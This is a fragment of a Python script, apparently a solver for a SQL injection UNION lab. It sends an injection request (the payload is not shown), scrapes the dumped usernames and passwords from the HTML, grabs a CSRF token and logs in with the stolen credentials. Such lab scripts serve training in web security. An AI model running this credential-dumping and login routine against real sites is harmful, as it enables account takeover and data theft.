...
def sqli_union_lab_3(null, index, url):
    ...
    lab3 = api_session.get(url, params=sqli)

    # Parse the HTML output using Beautiful Soup
    html = BeautifulSoup(lab3.text, 'html.parser')
    usernames = [username.contents[0] for username in html(['th'])]
    passwords = [password.contents[0] for password in html(['td'])]
    user_pass = dict(zip(usernames, passwords))

    # Perform a GET request against /login to grab the csrfToken
    url = url.replace('/page', '/login')
    lab3 = api_session.get(url)
    html = BeautifulSoup(lab3.text, 'html.parser')
    ...
    lab3 = api_session.post(url, data=payload)
...
if __name__ == '__main__':
    ...
    login = sqli_union_lab_3(null=null.copy(), index=index, url=url)
